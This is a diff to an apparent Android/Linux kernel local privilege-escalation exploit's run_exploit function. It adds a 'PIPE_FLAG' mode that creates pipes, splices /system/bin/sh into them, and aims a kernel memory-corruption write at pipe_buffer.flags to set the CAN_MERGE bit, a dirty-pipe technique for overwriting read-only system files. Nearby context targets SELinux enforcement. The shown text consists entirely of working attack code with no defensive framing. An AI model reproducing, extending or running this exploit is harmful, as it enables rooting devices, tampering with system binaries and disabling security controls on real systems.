@@ -3472,6 +3472,39 @@ int run_exploit(int argc, char **argv) {
   /* FORCE_WRITE1=1: skip UMH mode=4 and go straight to SELinux write1. */
   int force_w1 = env_flag("FORCE_WRITE1", 0);
   /*
+   * PIPE_FLAG pre-work: leak the pipe slab page BEFORE the target
+   * resolution needs pipebuf_page_base. Also splice the overwrite
+   * target's pages into the reclaim pipes (dirty-pipe prep).
+   */
+  if (env_flag("MODE4_PIPE_FLAG", 0) && !pipebuf_page_base) {
+    /* Create the pipes (kmalloc-2k pipe_buffer arrays) + splice the
+     * overwrite target into them. The pipe page ADDRESS leak still
+     * needs the kernelsnitch machinery from pipe.c's
+     * prepare_pipe_buffer_page — TODO: port or use PIPE_BUF_PROBE env. */
+    for (int i = 0; i < 16; i++) {
+      if (pipe(pr_reclaim_fds[i]) != 0) {
+        pr_error("PIPE_FLAG pipe[%d] errno=%d\n", i, errno);
+        break;
+      }
+      fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ, 32 * PAGE_SIZE);
+    }
+    int ofd = open("/system/bin/sh", O_RDONLY);
+    if (ofd >= 0) {
+      for (int i = 0; i < 16; i++) {
+        off64_t off = 0;
+        splice(ofd, &off, pr_reclaim_fds[i][1], NULL, 1, 0);
+      }
+      close(ofd);
+      pr_info("PIPE_FLAG: 16 pipes created, spliced /system/bin/sh\n");
+    }
+    const char *pb = getenv("PIPE_BUF_ADDR");
+    if (pb && pb[0]) {
+      pipebuf_page_base = (uintptr_t)strtoull(pb, NULL, 0);
+      pr_info("PIPE_FLAG manual page: %016zx (PIPE_BUF_ADDR)\n",
+              pipebuf_page_base);
+    }
+  }
+  /*
    * MODE4_WRITE_PROOF / MODE4_ARISTOTLE: prove rb_erase store without fops swap.
    * Default target = sysctl_bootid (P0). Compare /proc boot_id before/after.
    * WRITE_PROOF_TARGET=enforce|fops|bootid (default bootid).
@@ -3545,6 +3578,19 @@ int run_exploit(int argc, char **argv) {
         proof_val = 0;
         desc = "SLIDE_ZERO data-only";
       }
+    } else if (env_flag("MODE4_PIPE_FLAG", 0) && pipebuf_page_base) {
+      /*
+       * PIPE-FLAG (polygraphene S26 recipe; 09-14 pivot from dead configfs):
+       * same JC2 walk, re-aimed at pipe_buffer.flags. The VALUE = a kernel
+       * address whose low byte = 0x10 (CAN_MERGE) — our sprayed page base
+       * +0x10 works (32KB-aligned base → low byte 0x10). The erase's
+       * only-left store: *(pipe_buffer.flags+0x18) = pc → flags = 0x10.
+       * Pre-spliced file pages in the pipe become dirty-pipe-writable.
+       */
+      uintptr_t pipe_flags_target = pipebuf_page_base + 0x18;
+      proof_tgt = pipe_flags_target;
+      proof_val = 0;
+      desc = "PIPE_FLAG (only-left *pipe_buffer.flags=page|CAN_MERGE)";
     } else if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux")) {
       proof_tgt = data_addr(SELINUX_ENFORCING);
       proof_val = 0;
